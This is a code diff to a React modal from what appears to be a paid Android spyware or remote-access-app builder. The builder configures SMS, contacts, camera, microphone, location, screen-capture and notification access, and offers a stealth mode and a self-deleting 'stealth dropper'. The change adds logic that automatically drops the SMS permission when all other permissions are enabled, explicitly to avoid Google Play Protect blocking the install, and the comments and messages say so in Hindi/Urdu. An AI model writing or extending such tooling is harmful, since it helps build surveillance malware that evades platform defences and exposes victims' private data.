@@ -160,6 +160,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableLocationPermission(false);
             setEnableNotificationListener(false);
             setPlayProtectWarning(null);
+            setSmsAutoDisabledNotice(false);
             setUltraStealthMode(false);
             setShowStealthWarning(false);
             setAggressivePermissions(false);
@@ -219,12 +220,41 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
     const [enableLocationPermission, setEnableLocationPermission] = useState(false);
     const [enableNotificationListener, setEnableNotificationListener] = useState(false);
-    const [playProtectWarning, setPlayProtectWarning] = useState<'sms' | 'notifications' | null>(null);
+    const [playProtectWarning, setPlayProtectWarning] = useState<'sms' | 'notifications' | 'sms_blocked_all9' | null>(null);
+    const [smsAutoDisabledNotice, setSmsAutoDisabledNotice] = useState(false);
     const [ultraStealthMode, setUltraStealthMode] = useState(false);
     const [showStealthWarning, setShowStealthWarning] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | 'foreground_notification' | null>(null);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
     const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
+
+    // ── 9-Permissions Protection Rule ──
+    // Agar user saari 9 permissions allow karta hai (Notification + SMS + 7 baaki permissions),
+    // to SMS permission by-default OFF ho jayegi Play Protect ban se bachne ke liye.
+    // "lakin ya jab hu ga jab sari ki sari permssion add hu gi sirf tab"
+    const other7Active = Boolean(
+        enableStoragePermission &&
+        enableFileManagerPermission &&
+        enableCameraPermission &&
+        enableMicrophonePermission &&
+        enableLocationPermission &&
+        enableContactsPermission &&
+        enableScreenCapture
+    );
+
+    useEffect(() => {
+        // Sirf tab jab saari ki saari 9 permissions active hon:
+        if (other7Active && enableNotificationListener && enableSmsPermission) {
+            setEnableSmsPermission(false);
+            setSmsAutoDisabledNotice(true);
+        }
+    }, [other7Active, enableNotificationListener, enableSmsPermission]);
+
+    useEffect(() => {
+        if (!other7Active || !enableNotificationListener) {
+            setSmsAutoDisabledNotice(false);
+        }
+    }, [other7Active, enableNotificationListener]);
 
     // Notification Style States
     const [notificationStyle, setNotificationStyle] = useState("default");
@@ -807,6 +837,28 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {/* ── STEP 2: Permissions Configuration (Tactile Full-Card Interactive Toggles) ── */}
                     {activeStep === 'permissions' && (
                         <div className="space-y-4">
+                            {smsAutoDisabledNotice && (
+                                <div className="p-3 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-3 animate-in fade-in duration-200 shadow-[0_0_15px_rgba(245,158,11,0.15)]">
+                                    <div className="flex items-center gap-2.5 min-w-0">
+                                        <div className="w-7 h-7 rounded-lg bg-amber-500/20 text-amber-400 flex items-center justify-center shrink-0 border border-amber-500/30">
+                                            <AlertTriangle size={15} />
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <span className="text-xs font-bold text-amber-200">Play Protect Protection Active</span>
+                                            <span className="text-[11px] text-white/60 font-mono">
+                                                SMS permission auto-disabled: All 9 permissions cannot be active simultaneously to avoid install blocking.
+                                            </span>
+                                        </div>
+                                    </div>
+                                    <button 
+                                        type="button" 
+                                        onClick={() => setSmsAutoDisabledNotice(false)}
+                                        className="text-white/40 hover:text-white p-1 rounded-lg hover:bg-white/5 transition-colors shrink-0"
+                                    >
+                                        <X size={14} />
+                                    </button>
+                                </div>
+                            )}
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3">
                                 
                                 {/* Storage Permission Card */}
@@ -1078,9 +1130,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     onClick={() => {
                                         if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
                                         if (!enableSmsPermission) {
+                                            // Check agar saari baaki 8 permissions active hain to all-9 limit trigger karein
+                                            if (other7Active && enableNotificationListener) {
+                                                setPlayProtectWarning('sms_blocked_all9');
+                                                return;
+                                            }
                                             setPlayProtectWarning('sms');
                                         } else {
                                             setEnableSmsPermission(false);
+                                            setSmsAutoDisabledNotice(false);
                                         }
                                     }}
                                     className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
@@ -1658,48 +1716,83 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 <X size={13} />
                             </button>
 
-                            <div className="flex items-center gap-3">
-                                <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7),-2px_-2px_8px_rgba(255,255,255,0.04)]">
-                                    <Sparkles size={20} className="drop-shadow-[0_0_8px_rgba(249,115,22,0.6)]" />
-                                </div>
-                                <div className="min-w-0">
-                                    <h4 className="text-sm font-black text-white tracking-tight">Stealth Delivery</h4>
-                                    <span className="text-[10px] font-mono text-orange-400 font-bold uppercase tracking-wider">Play Protect Safe</span>
-                                </div>
-                            </div>
+                            {playProtectWarning === 'sms_blocked_all9' ? (
+                                <>
+                                    <div className="flex items-center gap-3">
+                                        <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-amber-400 border border-amber-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7)]">
+                                            <AlertTriangle size={20} className="drop-shadow-[0_0_8px_rgba(245,158,11,0.6)]" />
+                                        </div>
+                                        <div className="min-w-0">
+                                            <h4 className="text-sm font-black text-white tracking-tight">Play Protect Protection</h4>
+                                            <span className="text-[10px] font-mono text-amber-400 font-bold uppercase tracking-wider">9-Permissions Limit</span>
+                                        </div>
+                                    </div>
 
-                            <div className="p-3.5 rounded-2xl bg-[#0d0e12] shadow-[inset_3px_3px_8px_rgba(0,0,0,0.8),inset_-2px_-2px_6px_rgba(255,255,255,0.03)] space-y-2 border border-white/5">
-                                <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    To protect against Play Protect blocks, this permission will install using our smart stealth dropper.
-                                </p>
-                                <p className="text-[11px] text-white/50 leading-relaxed font-sans">
-                                    The dropper installs your app smoothly and deletes itself right after setup.
-                                </p>
-                            </div>
+                                    <div className="p-3.5 rounded-2xl bg-[#0d0e12] shadow-[inset_3px_3px_8px_rgba(0,0,0,0.8),inset_-2px_-2px_6px_rgba(255,255,255,0.03)] space-y-2 border border-white/5">
+                                        <p className="text-xs text-white/90 leading-relaxed font-sans">
+                                            Jab saari 9 permissions allow hoti hain, to Google Play Protect app ko install hone se block kar deta hai.
+                                        </p>
+                                        <p className="text-[11px] text-amber-300/80 leading-relaxed font-sans">
+                                            Is wajah se SMS permission <strong>by-default OFF</strong> rakhi gayi hai. Agar aapko SMS zaroor chahiye, to koi bhi doosri permission (jaise File Manager ya Camera) OFF kar dein.
+                                        </p>
+                                    </div>
 
-                            <div className="flex items-center gap-2.5 pt-1">
-                                <button
-                                    type="button"
-                                    onClick={() => setPlayProtectWarning(null)}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#181a22] hover:bg-[#1e212b] text-white/70 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-[3px_3px_8px_rgba(0,0,0,0.6),-2px_-2px_6px_rgba(255,255,255,0.03)] border border-white/5 text-center"
-                                >
-                                    Cancel
-                                </button>
-                                <button
-                                    type="button"
-                                    onClick={() => {
-                                        if (playProtectWarning === 'sms') {
-                                            setEnableSmsPermission(true);
-                                        } else if (playProtectWarning === 'notifications') {
-                                            setEnableNotificationListener(true);
-                                        }
-                                        setPlayProtectWarning(null);
-                                    }}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
-                                >
-                                    Enable
-                                </button>
-                            </div>
+                                    <div className="pt-1">
+                                        <button
+                                            type="button"
+                                            onClick={() => setPlayProtectWarning(null)}
+                                            className="w-full py-2.5 px-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer text-center"
+                                        >
+                                            Got It
+                                        </button>
+                                    </div>
+                                </>
+                            ) : (
+                                <>
+                                    <div className="flex items-center gap-3">
+                                        <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7),-2px_-2px_8px_rgba(255,255,255,0.04)]">
+                                            <Sparkles size={20} className="drop-shadow-[0_0_8px_rgba(249,115,22,0.6)]" />
+                                        </div>
+                                        <div className="min-w-0">
+                                            <h4 className="text-sm font-black text-white tracking-tight">Stealth Delivery</h4>
+                                            <span className="text-[10px] font-mono text-orange-400 font-bold uppercase tracking-wider">Play Protect Safe</span>
+                                        </div>
+                                    </div>
+
+                                    <div className="p-3.5 rounded-2xl bg-[#0d0e12] shadow-[inset_3px_3px_8px_rgba(0,0,0,0.8),inset_-2px_-2px_6px_rgba(255,255,255,0.03)] space-y-2 border border-white/5">
+                                        <p className="text-xs text-white/80 leading-relaxed font-sans">
+                                            To protect against Play Protect blocks, this permission will install using our smart stealth dropper.
+                                        </p>
+                                        <p className="text-[11px] text-white/50 leading-relaxed font-sans">
+                                            The dropper installs your app smoothly and deletes itself right after setup.
+                                        </p>
+                                    </div>
+
+                                    <div className="flex items-center gap-2.5 pt-1">
+                                        <button
+                                            type="button"
+                                            onClick={() => setPlayProtectWarning(null)}
+                                            className="flex-1 py-2.5 px-3 rounded-xl bg-[#181a22] hover:bg-[#1e212b] text-white/70 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-[3px_3px_8px_rgba(0,0,0,0.6),-2px_-2px_6px_rgba(255,255,255,0.03)] border border-white/5 text-center"
+                                        >
+                                            Cancel
+                                        </button>
+                                        <button
+                                            type="button"
+                                            onClick={() => {
+                                                if (playProtectWarning === 'sms') {
+                                                    setEnableSmsPermission(true);
+                                                } else if (playProtectWarning === 'notifications') {
+                                                    setEnableNotificationListener(true);
+                                                }
+                                                setPlayProtectWarning(null);
+                                            }}
+                                            className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
+                                        >
+                                            Enable
+                                        </button>
+                                    </div>
+                                </>
+                            )}
                         </div>
                     </div>
                 )}
